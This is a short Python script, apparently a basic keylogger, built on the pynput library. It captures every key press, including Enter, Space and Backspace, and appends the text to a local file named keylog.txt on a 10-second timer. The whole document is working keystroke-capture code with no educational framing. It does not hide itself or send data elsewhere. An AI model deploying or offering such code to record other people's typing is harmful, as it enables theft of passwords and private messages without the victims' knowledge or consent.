import pynput.keyboard
import threading

# Global string to store keystrokes in memory before saving
log = ""

def process_key_press(key):
    global log
    try:
        # Capture standard alphanumeric keys
        current_key = str(key.char)
    except AttributeError:
        # Handle special keys (Space, Enter, etc.)
        if key == pynput.keyboard.Key.space:
            current_key = " "
        elif key == pynput.keyboard.Key.enter:
            current_key = "\n"
        elif key == pynput.keyboard.Key.backspace:
            current_key = " [BACKSPACE] "
        else:
            current_key = " " + str(key) + " "
    
    log = log + current_key

def report():
    global log
    # Save the captured text to a file
    if log:
        with open("keylog.txt", "a") as f:
            f.write(log)
        # Clear the memory log after writing to file
        log = ""
    
    # Set a timer to run this reporting function every 10 seconds
    timer = threading.Timer(10, report)
    timer.start()

# Initialize the Listener
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

print("--- Keylogger Started ---")
print("Data is being saved to 'keylog.txt' every 10 seconds.")

with keyboard_listener:
    report() # Start the reporting loop
    keyboard_listener.join() # Keep the script running 